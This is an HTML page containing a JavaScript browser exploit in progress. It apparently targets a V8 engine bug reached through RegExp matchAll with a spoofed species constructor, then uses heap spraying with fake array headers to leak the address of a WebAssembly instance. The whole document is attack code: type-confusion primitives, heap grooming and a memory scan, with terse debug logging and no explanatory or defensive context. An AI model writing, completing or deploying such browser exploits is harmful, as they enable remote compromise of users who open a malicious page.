<!doctype html><html><head><meta charset="utf-8"><title>P32</title></head>
<body><pre id="out">Running...</pre>
<script>
"use strict";
const O=document.getElementById("out");
function log(s){O.textContent+="\n"+s;}
const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
const PINS=[0x1080011];
const marker={mmm:1};
const objB=new Array(0x8000);
for(let i=0;i<objB.length;i++)objB[i]=marker;
const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
objB[2]=wasmI;
const re=/(?:)/;
const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
const c0=w2f(DMAP,EMPTY);
const sk=[];
log("UA: "+navigator.userAgent);
trash(230);trash(230);
RegExp.prototype[Symbol.matchAll].call(fk,"").next();
log("TRIG: "+re.lastIndex);
trash(230);trash(230);
for(let r=0;r<3;r++){
  const pin=PINS[r%2];
  const c1=w2f(pin,MAXS);
  for(let i=0;i<12;i++){
    const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);
    for(let j=1;j<a.length;j+=2)a[j]=c1;
    sk.push(a);
  }
}
try{
const m=re.lastIndex;
log("T: "+typeof m+" A="+Array.isArray(m));
if(Array.isArray(m)){
  log("L: "+m.length);
  // Scan for transition: (mk,mk)->(wasmI,mk) with WIDE range (up to 256MB cage)
  let OB=-1;
  for(let k=0;k<0x7000;k++){
    try{
      const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
      // EXPANDED range: lo > 0x100 && lo < 0x10000000 (256MB)
      if(lo===hi&&(lo&1n)===1n&&lo>0x100n&&lo<0x10000000n){
        const v1=f2i(m[k+1]);
        const lo1=v1&0xffffffffn,hi1=v1>>32n;
        if(lo1!==lo&&hi1===lo&&(lo1&1n)===1n){
          OB=k;
          log("OB:"+k.toString(16)+" MK:"+lo.toString(16)+" WI:"+lo1.toString(16));
          break;
        }
      }
    }catch(e){break;}
  }
  // Also scan page 2 if not found
  if(OB<0){
    for(let k=0x8000;k<0xE000;k++){
      try{
        const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
        if(lo===hi&&(lo&1n)===1n&&lo>0x100n&&lo<0x10000000n){
          const v1=f2i(m[k+1]);
          const lo1=v1&0xffffffffn,hi1=v1>>32n;
          if(lo1!==lo&&hi1===lo&&(lo1&1n)===1n){
            OB=k;
            log("OB2:"+k.toString(16)+" MK:"+lo.toString(16)+" WI:"+lo1.toString(16));
            break;
          }
        }
      }catch(e){log("E2:"+k.toString(16));break;}
    }
  }
  if(OB>=0){
    const wasmPtr=f2i(m[OB+1])&0xffffffffn;
    log("W:"+wasmPtr.toString(16)+" O:"+(wasmPtr&1n).toString());
  }else{
    log("NF");
    // Show first 8 data values + count ALL matching pairs in page 1
    const d=[];
    for(let k=0;k<8;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");}}
    log("D:"+d.join(","));
    // Count pairs
    let cnt=0;
    for(let k=0;k<0x7000;k++){
      try{
        const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
        if(lo===hi&&(lo&1n)===1n&&lo>0x100n)cnt++;
      }catch(e){break;}
    }
    log("PAIRS:"+cnt);
  }
  log("W: "+wasmI.exports.f());
}else{log("NA");}
}catch(e){log("E: "+e.message);}
log("=== DONE ===");
</script></body></html>
